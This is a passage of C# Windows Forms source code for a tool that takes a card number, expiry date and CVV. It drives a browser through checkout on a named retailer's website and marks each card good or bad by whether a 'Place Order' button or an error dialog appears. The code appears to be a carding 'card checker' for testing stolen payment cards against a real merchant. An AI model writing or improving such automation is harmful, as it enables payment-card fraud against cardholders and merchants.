        //    //{
        //    try
        //    {
        //        string clickOk = @"document.querySelector('div.fancybox-wrap.fancybox-desktop.fancybox-type-html.fancybox-opened > div > div > div > div > div > div > input').click();";
        //        await browser.ExecuteScript(clickOk);
        //    }
        //    catch (Exception) { }
        //    //}
        //}

        private async Task<bool> Forseti()
        {
            //if (running)
            //{
            try
            {
                //browser.Screenshot("11.LatestData");
                //await ConsoleProgressDetail("Insuflando furia subatómica.", 90);

                bool hellheim = await browser.ElementVisible("div.fancybox-wrap.fancybox-desktop.fancybox-type-html.fancybox-opened > div > div > div > div > div > div > input", "ExceptionLastButtonOk");
                if (hellheim)
                {
                    //await ClickButtonOK();
                    return false;
                }
                else
                {
                    bool valhalla = await browser.ElementVisible("#btnPlaceOrder", "ExceptionLastButtonPlaceOrder");
                    if (valhalla)
                    {
                        return true;
                    }

                }
            }
            catch (Exception) { }
            //await ConsoleProgressDetail("Insuflando furia subatómica. ¡Fallo!", 90, "Fail");
            forsetiError = true;
            return false;
            //}
            //else { return false; }
        }
        #endregion

        #endregion

        private async void IconButtonCheck_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(TextBoxCC.Text) && TextBoxCC.Text != "################" && !string.IsNullOrEmpty(MaskedTextBoxDate.Text) && MaskedTextBoxDate.Text != "dd/aa" && !string.IsNullOrEmpty(TextBoxCvv.Text) && TextBoxCvv.Text != "###")
            {
                IconButton iconButton = (IconButton)sender;
                iconButton.IconColor = Color.Black;
                iconButton.Enabled = false;
                IconButtonStop.IconColor = Color.White;
                IconButtonStop.Enabled = true;
                IconButtonClear.IconColor = Color.Black;
                IconButtonClear.Enabled = false;
                IconPictureBoxValhalla.Hide();
                IconPictureBoxHelheim.Hide();
                IconPictureBoxCheck.Hide();
                PictureBoxWaitCheck.Show();
                await InvokeOdin();
            }
        }

        private async void IconButtonStop_Click(object sender, EventArgs e)
        {
            IconButton iconButton = (IconButton)sender;
            iconButton.IconColor = Color.Black;
            iconButton.Enabled = false;
            await browser.Kill("www.brownells.com");
            await tokenCancel.Kill();
            IconButtonCheck.IconColor = Color.White;
            IconButtonCheck.Enabled = true;
            IconButtonClear.IconColor = Color.White;
            IconButtonClear.Enabled = true;
            IconPictureBoxValhalla.Hide();
            IconPictureBoxHelheim.Hide();
            PictureBoxWaitCheck.Hide();
            IconPictureBoxCheck.Show();
        }

        private void IconButtonClear_Click(object sender, EventArgs e)
        {
            IconButton iconButton = (IconButton)sender;
            iconButton.IconColor = Color.Black;
            iconButton.Enabled = false;
            TextBoxCC.Placeholder("################");
            MaskedTextBoxDate.Placeholder("dd/aa");
            TextBoxCvv.Placeholder("###");
            IconPictureBoxValhalla.Hide();
            IconPictureBoxHelheim.Hide();
            PictureBoxWaitCheck.Hide();
            IconPictureBoxCheck.Show();
        }
    }
}